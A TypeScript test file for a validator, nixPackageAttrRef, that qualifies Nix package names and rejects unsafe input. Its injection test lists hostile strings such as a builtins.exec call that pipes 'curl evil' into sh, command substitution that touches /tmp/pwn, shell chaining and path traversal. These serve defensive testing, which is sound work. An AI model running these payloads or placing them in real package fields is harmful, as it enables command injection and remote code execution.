import { describe, expect, it } from "bun:test";
import { nixPackageAttrRef } from "../executor/subprocess.js";

describe("nixPackageAttrRef", () => {
  it("accepts a plain leaf package and qualifies it", () => {
    expect(nixPackageAttrRef("ffmpeg")).toBe("pkgs.ffmpeg");
    expect(nixPackageAttrRef("imagemagick")).toBe("pkgs.imagemagick");
    expect(nixPackageAttrRef("ghostscript")).toBe("pkgs.ghostscript");
  });

  it("accepts an allow-listed namespaced attr path", () => {
    expect(nixPackageAttrRef("python3Packages.requests")).toBe(
      "pkgs.python3Packages.requests"
    );
    expect(nixPackageAttrRef("nodePackages.typescript")).toBe(
      "pkgs.nodePackages.typescript"
    );
  });

  it("rejects Nix-expression / shell injection payloads", () => {
    const injections = [
      'x; builtins.exec ["sh" "-c" "curl evil|sh"]',
      "import ./evil.nix",
      "ffmpeg; touch /tmp/pwn",
      "$(touch /tmp/pwn)",
      "`touch /tmp/pwn`",
      "a && b",
      "a|b",
      "pkgs.fetchurl { url = 1; }",
      "../escape",
      "foo.bar.baz",
      "unknownNamespace.requests",
    ];
    for (const payload of injections) {
      expect(() => nixPackageAttrRef(payload)).toThrow();
    }
  });

  it("rejects non-string input", () => {
    // @ts-expect-error exercising runtime guard against malformed config
    expect(() => nixPackageAttrRef(undefined)).toThrow();
    // @ts-expect-error exercising runtime guard against malformed config
    expect(() => nixPackageAttrRef({ toString: () => "evil" })).toThrow();
  });
});
